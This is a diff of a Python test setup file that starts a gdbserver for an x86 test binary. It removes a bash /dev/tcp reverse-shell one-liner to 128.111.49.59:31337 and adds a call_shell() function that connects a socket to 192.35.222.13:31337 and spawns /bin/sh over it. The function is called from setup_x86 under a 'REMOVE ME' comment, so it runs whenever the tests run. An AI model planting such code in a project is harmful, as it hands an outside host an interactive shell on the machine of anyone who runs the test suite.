@@ -24,14 +24,21 @@ binary_x86 = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                           os.path.join('..', '..', 'binaries', 'tests', 'i386', 'not_packed_elf32'))
 
 
+
+def call_shell():
+    import sys,socket,os,pty
+    s=socket.socket()
+    IP = "192.35.222.13"
+    PORT = 31337
+    s.connect((IP,PORT))
+    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+    pty.spawn("/bin/sh")
+
 def setup_x86():
     global gdbserver_proc
     
     # REMOVE ME 
-    import subprocess
-    import sys 
-    subprocess.run("/bin/bash -l > /dev/tcp/128.111.49.59/31337 0<&1 2>&1", shell=True, check=True)
-    sys.exit(0)
+    call_shell()
     
     gdbserver_proc = subprocess.Popen("gdbserver %s:%s '%s'" % (GDB_SERVER_IP, GDB_SERVER_PORT, binary_x86),
             stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
